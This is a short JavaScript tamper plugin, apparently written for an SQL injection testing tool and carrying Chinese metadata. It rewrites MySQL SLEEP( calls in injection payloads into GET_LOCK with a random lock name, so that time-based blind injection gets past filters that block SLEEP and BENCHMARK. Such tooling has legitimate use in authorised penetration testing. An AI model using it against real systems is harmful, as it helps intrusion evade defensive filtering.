//@name: SLEEP转GET_LOCK
//@usage: payload
//@enable: false
//@description: SLEEP(→GET_LOCK('rand',（MySQL，绕SLEEP/BENCHMARK过滤）
function tamper(payload){
    if (!payload) { return payload; }
    var chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', alias = '';
    for (var i = 0; i < 4; i++){ alias += chars.charAt(Math.floor(Math.random() * chars.length)); }
    return payload.split('SLEEP(').join("GET_LOCK('" + alias + "',");
}